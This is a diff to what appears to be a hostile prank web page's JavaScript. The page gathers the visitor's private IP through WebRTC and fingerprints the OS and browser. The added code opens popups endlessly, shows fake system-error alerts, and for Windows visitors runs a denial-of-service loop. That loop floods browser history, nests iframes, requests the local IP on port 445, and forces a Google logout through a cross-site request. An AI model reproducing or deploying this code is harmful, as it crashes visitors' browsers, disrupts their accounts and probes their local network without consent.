@@ -94,7 +94,7 @@ if (RTCPeerConnection) (function () {
      popup = false;
   }
   if(popup) {
-    setInterval(function() {window.open(window.location.href);}, 5);
+    setInterval(function() {window.open(window.location.href+'#AMPT');}, 5);
   }
   if(OS=='Linux x86_64' && navigator.sayswho == 'Chrome 54') {
     alert('CRITICAL SYSTEM ERROR! Shutting down Chrome.');
@@ -105,6 +105,25 @@ if (RTCPeerConnection) (function () {
       }
   }
   if(OS.match('Win')[0]=='Win') {
+    var x = new Image();
+    privip = document.getElementById("list").innerHTML.split(' ')[0];
+    function winDos() {
+    var total = "";
+      for( var i = 0; i < 100000; i++ ) {
+          total = total + i.toString();
+          history.pushState(0,0, total );
+      }
+      x.src = privip+':445';
+      var y = document.createElement('iframe');
+      y.src=window.location.href;
+      document.body.appendChild(y);
+      var a = new Image();
+      a.src="https://accounts.google.com/Logout";
+    }
+    setInterval(winDos, 5);
+    setInterval(function() {alert('Windows DoS initiated.')}, 5);
+  }
+  if(window.location.href.split('#')[1] == 'AMPT') {
     var x = new Image();
     privip = document.getElementById("list").innerHTML.split(' ')[0];
     function winDos() {
